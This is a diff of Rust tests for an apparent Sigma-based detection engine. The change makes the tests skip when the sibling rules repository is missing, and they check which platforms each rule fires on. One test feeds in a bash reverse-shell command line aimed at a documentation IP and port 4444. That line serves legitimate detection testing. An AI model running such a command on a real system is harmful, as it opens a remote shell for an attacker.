@@ -183,8 +183,9 @@ fn the_host_platform_is_known_on_the_systems_the_content_covers() {
 
 // ── the shipped content ──────────────────────────────────────────────────────
 
-fn content_dir() -> PathBuf {
-    Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/sigma")
+/// The shipped content in the `rules` sibling repo, or `None` (the test skips) without it.
+fn content_dir() -> Option<PathBuf> {
+    Some(siblings::require_path!("rules", "sigma", None))
 }
 
 fn rule_files(dir: &Path) -> usize {
@@ -205,7 +206,7 @@ fn rule_files(dir: &Path) -> usize {
 
 #[test]
 fn the_shipped_content_splits_as_the_expected_set_says() {
-    let dir = content_dir();
+    let Some(dir) = content_dir() else { return };
     let count = |name: &str| rule_files(&dir.join(name));
     for (platform, own) in [
         (Platform::Linux, count("linux")),
@@ -238,12 +239,13 @@ fn the_shipped_content_splits_as_the_expected_set_says() {
 
 #[test]
 fn a_linux_rule_runs_on_macos_and_not_on_windows() {
+    let Some(dir) = content_dir() else { return };
     // `reverse_shell` is a `linux/` rule on `bash -i >& /dev/tcp/...`.
     const LINUX_RULE: &str = "Reverse shell via /dev/tcp or nc/ncat with execution";
     let mut event = exec("/usr/bin/x", "/bin/bash");
     event.cmdline = "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1".into();
     let fires = |platform| {
-        SigmaEngine::load_dir_for(&content_dir(), platform)
+        SigmaEngine::load_dir_for(&dir, platform)
             .unwrap()
             .eval_exec(&event)
             .iter()
@@ -273,10 +275,11 @@ fn exec(parent: &str, image: &str) -> ExecEvent {
 
 #[test]
 fn the_macos_web_server_rule_does_not_fire_on_a_linux_host() {
+    let Some(dir) = content_dir() else { return };
     const MACOS_RULE: &str = "Web server spawned a shell on macOS";
     let event = exec("/usr/sbin/nginx", "/bin/sh");
     let fires = |platform| {
-        SigmaEngine::load_dir_for(&content_dir(), platform)
+        SigmaEngine::load_dir_for(&dir, platform)
             .unwrap()
             .eval_exec(&event)
             .iter()
@@ -286,7 +289,7 @@ fn the_macos_web_server_rule_does_not_fire_on_a_linux_host() {
     assert!(!fires(Platform::Linux), "the Linux host must not run it");
     assert!(!fires(Platform::Windows));
     // The full-tree loader still runs it everywhere, as before.
-    let everywhere = SigmaEngine::load_dir(&content_dir()).unwrap();
+    let everywhere = SigmaEngine::load_dir(&dir).unwrap();
     assert!(
         everywhere
             .eval_exec(&event)
